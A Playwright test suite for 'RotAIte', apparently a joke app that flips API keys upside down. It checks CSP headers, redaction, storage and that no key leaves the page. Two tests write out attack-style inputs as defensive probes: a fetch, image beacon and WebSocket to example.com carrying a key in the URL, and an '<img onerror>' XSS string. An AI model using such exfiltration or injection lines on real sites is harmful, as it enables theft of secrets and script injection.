import { expect, test, type Page } from "@playwright/test"

// A token in GitHub's format, generated so the repo never contains one.
function fakeGithubToken() {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
  const body = Array.from({ length: 36 }, () => chars[Math.floor(Math.random() * chars.length)]).join("")
  return `ghp_${body}`
}

/** Collects every request the page makes, plus console errors and CSP violations. */
async function watch(page: Page) {
  const requests: string[] = []
  const problems: string[] = []
  page.on("request", (request) => requests.push(request.url()))
  page.on("console", (message) => {
    if (message.type() === "error") problems.push(message.text())
  })
  page.on("pageerror", (error) => problems.push(error.message))
  await page.addInitScript(() => {
    document.addEventListener("securitypolicyviolation", (event) => {
      console.error(`CSP violation: ${event.violatedDirective} ${event.blockedURI}`)
    })
  })
  return { requests, problems }
}

const keyBox = (page: Page) => page.getByRole("textbox", { name: /API keys to rotate/ })
const rotateButton = (page: Page) => page.getByRole("button", { name: /^Rotate keys/ })

test.use({ contextOptions: { reducedMotion: "reduce" } })

test("serves a locked-down security policy", async ({ request }) => {
  const response = await request.get("/")
  const headers = response.headers()
  const csp = headers["content-security-policy"]
  expect(csp).toContain("default-src 'none'")
  expect(csp).toContain("connect-src 'none'")
  expect(csp).toContain("form-action 'none'")
  expect(csp).toContain("frame-ancestors 'none'")
  expect(csp).toContain("script-src 'self'")
  expect(headers["referrer-policy"]).toBe("no-referrer")
  expect(headers["x-frame-options"]).toBe("DENY")
  expect(headers["permissions-policy"]).toContain("camera=()")
})

test("rotating makes no network requests at all", async ({ page }) => {
  const { requests, problems } = await watch(page)
  await page.goto("/", { waitUntil: "networkidle" })
  const loaded = requests.length

  await page.getByRole("button", { name: "Hallucinate fake keys" }).click()
  await keyBox(page).fill("hunter2\nsk-not-real")
  await rotateButton(page).click()
  await expect(page.getByTestId("result")).toContainText("2 keys rotated by 180°")
  await page.getByRole("radio", { name: "Keys" }).click()
  await page.getByRole("button", { name: "Rotate again" }).click()
  await page.getByRole("radio", { name: "Everything" }).click()
  await page.keyboard.press("Escape")
  await page.getByRole("button", { name: "Edit keys" }).click()
  await keyBox(page).fill(fakeGithubToken())
  await rotateButton(page).click()
  await expect(page.getByTestId("result")).toBeVisible()

  expect(requests.slice(loaded)).toEqual([])
  expect(problems).toEqual([])
})

test("the browser blocks any attempt to phone home", async ({ page }) => {
  await page.goto("/")
  const outcome = await page.evaluate(async () => {
    const violations: string[] = []
    document.addEventListener("securitypolicyviolation", (event) => violations.push(event.violatedDirective))
    const fetched = await fetch("https://example.com/steal?key=hunter2").then(
      () => "sent",
      () => "blocked",
    )
    new Image().src = "https://example.com/pixel.gif?key=hunter2"
    try {
      new WebSocket("wss://example.com")
    } catch {
      // Some browsers throw right away instead of reporting.
    }
    await new Promise((resolve) => setTimeout(resolve, 300))
    return { fetched, violations }
  })
  expect(outcome.fetched).toBe("blocked")
  expect(outcome.violations).toContain("connect-src")
  expect(outcome.violations).toContain("img-src")
})

test("Trusted Types block HTML injection", async ({ page }) => {
  await page.goto("/")
  const threw = await page.evaluate(() => {
    try {
      document.body.insertAdjacentHTML("beforeend", "<img src=x onerror=alert(1)>")
      return false
    } catch {
      return true
    }
  })
  expect(threw).toBe(true)
})

test("warns about real-looking keys and redacts them", async ({ page }) => {
  const token = fakeGithubToken()
  await page.goto("/")
  await keyBox(page).fill(`hunter2\nGITHUB_TOKEN=${token}`)

  const warning = page.getByRole("alert")
  await expect(warning).toContainText("That looks like a real GitHub token")
  await expect(warning.getByRole("link", { name: /github\.com/ })).toHaveAttribute(
    "href",
    "https://github.com/settings/tokens",
  )

  await rotateButton(page).click()
  const view = page.getByTestId("rotated-view")
  await expect(view).toContainText("redacted")
  await expect(view).toContainText("ghp_••••")
  await expect(view).not.toContainText(token.slice(4, 12))
})

test("Share never includes anything from the box", async ({ page }) => {
  await page.addInitScript(() => {
    Object.defineProperty(navigator, "share", { value: undefined })
    navigator.clipboard.writeText = async (text: string) => {
      ;(window as unknown as { copied: string }).copied = text
    }
  })
  await page.goto("/")
  await keyBox(page).fill("hunter2\nsk-very-secret-but-fake")
  await rotateButton(page).click()
  await page.getByRole("button", { name: "Share the joke" }).click()
  const copied = await page.evaluate(() => (window as unknown as { copied: string }).copied)
  expect(copied).toContain("rotate 2 of my API keys by 180°")
  expect(copied).not.toContain("hunter2")
  expect(copied).not.toContain("very-secret")
})

test("copies keys upside down", async ({ page }) => {
  await page.addInitScript(() => {
    navigator.clipboard.writeText = async (text: string) => {
      ;(window as unknown as { copied: string }).copied = text
    }
  })
  await page.goto("/")
  await keyBox(page).fill("hello\nworld")
  await rotateButton(page).click()
  await page.getByRole("button", { name: "Copy rotated keys" }).click()
  const copied = await page.evaluate(() => (window as unknown as { copied: string }).copied)
  expect(copied).toBe("plɹoʍ\nollǝɥ")
})

test("rotates the entire website, and Esc puts it back", async ({ page }) => {
  await page.goto("/")
  await keyBox(page).fill("hunter2")
  await page.getByRole("radio", { name: "Everything" }).click()
  await rotateButton(page).click()
  const site = page.locator("#top")
  await expect(site).toHaveAttribute("style", /rotate\(180deg\)/)
  await expect(page.getByText("Your entire website has been rotated 180°")).toBeVisible()
  await expect(page).toHaveTitle(/ǝʇI∀ʇoᴚ$/)
  await page.keyboard.press("Escape")
  await expect(site).toHaveAttribute("style", /rotate\(0deg\)/)
  await expect(page).toHaveTitle("RotAIte · AI-powered API key rotation")
})

test("hallucinates keys when the box is empty", async ({ page }) => {
  await page.goto("/")
  await rotateButton(page).click()
  await expect(page.getByTestId("result")).toContainText("5 keys rotated by 180°")
})

test("Ctrl/Cmd+Enter rotates", async ({ page }) => {
  await page.goto("/")
  await keyBox(page).fill("hunter2")
  await keyBox(page).press("ControlOrMeta+Enter")
  await expect(page.getByTestId("result")).toContainText("1 key rotated by 180°")
})

test("the box opts out of spellcheck, autofill and grammar extensions", async ({ page }) => {
  await page.goto("/")
  const box = keyBox(page)
  await expect(box).toHaveAttribute("spellcheck", "false")
  await expect(box).toHaveAttribute("autocomplete", "off")
  await expect(box).toHaveAttribute("data-gramm", "false")
  await expect(box).toHaveAttribute("data-lpignore", "true")
})

test("leaving the page wipes the box", async ({ page }) => {
  await page.goto("/")
  await keyBox(page).fill("hunter2")
  await page.evaluate(() => window.dispatchEvent(new PageTransitionEvent("pagehide")))
  await expect(keyBox(page)).toHaveValue("")
})

test("nothing is stored in the browser", async ({ page, context }) => {
  await page.goto("/")
  await keyBox(page).fill("hunter2")
  await rotateButton(page).click()
  await expect(page.getByTestId("result")).toBeVisible()
  const stored = await page.evaluate(() => ({
    local: localStorage.length,
    session: sessionStorage.length,
    cookie: document.cookie,
  }))
  expect(stored).toEqual({ local: 0, session: 0, cookie: "" })
  expect(await context.cookies()).toEqual([])
})
